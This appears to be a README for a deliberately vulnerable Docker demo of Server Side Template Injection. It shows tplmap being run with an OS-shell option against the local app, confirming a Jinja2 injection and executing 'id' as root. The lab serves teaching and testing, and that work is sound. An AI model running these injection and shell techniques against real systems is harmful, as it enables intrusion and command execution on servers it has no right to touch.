Server Side Template Injection
=============
This demo demonstrates a very simple SSTI example.

Build and run the Dockerfile:

```bash
$ docker build -t sstidemo .
$ docker run -p 3000:3000 sstidemo
```

You can exploit this manually with a Jinja2 injection, or you can use [tplmap](https://github.com/epinna/tplmap) which is a SSTI exploitation/detection tool. 

```bash
$ python3 tplmap.py --request GET -u 'http://0.0.0.0:3000/*' --os-shell

Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

Testing if URL parameter 'url' is injectable
Smarty plugin is testing rendering with tag '*'
Smarty plugin is testing blind injection
Mako plugin is testing rendering with tag '${*}'
Mako plugin is testing blind injection
Python plugin is testing rendering with tag 'str(*)'
Python plugin is testing blind injection
Tornado plugin is testing rendering with tag '{{*}}'
Tornado plugin is testing blind injection
Jinja2 plugin is testing rendering with tag '{{*}}'
Jinja2 plugin has confirmed injection with tag '{{*}}'
Tplmap identified the following injection point:

  URL parameter: url
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

Run commands on the operating system.

posix-linux $ id
uid=0(root) gid=0(root) groups=0(root)

posix-linux $ ls
__pycache__
main.py
static
templates
posix-linux $ Exiting.
```
